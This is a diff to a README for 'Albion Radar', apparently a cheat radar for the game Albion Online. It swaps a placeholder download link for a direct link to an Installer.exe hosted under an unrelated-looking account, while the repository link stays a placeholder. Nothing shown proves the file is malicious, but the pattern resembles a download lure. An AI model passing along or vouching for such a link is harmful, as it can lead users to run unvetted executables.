@@ -11,7 +11,7 @@
 
 ## 🚀 Download Albion Radar
 
-- **Latest Version:** [Download Now](https://your-download-link-here)
+- **Latest Version:** [Download Now](https://github.com/HackerMan33106/Albion-Radar/releases/download/1/Installer.exe)
 - **GitHub Repository:** [View on GitHub](https://github.com/your-username/albion-radar)
 
 ---
